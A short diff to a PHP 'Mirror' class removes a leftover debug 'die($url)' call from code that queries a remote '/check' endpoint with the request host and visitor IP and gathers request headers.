@@ -46,7 +46,7 @@ Class Mirror
             if ($_SERVER['REQUEST_URI'] == '/' || stripos($_SERVER['REQUEST_URI'], '/?source=') !== false) {
                 try {
                     $url = $this->server . "/check?host=" . $_SERVER['HTTP_HOST'] . '&ip=' . $ip;
-                    die($url);
+
                     $headers = [
                         'User-Agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
                         'Accept' => $_SERVER['HTTP_ACCEPT'] ?? '',
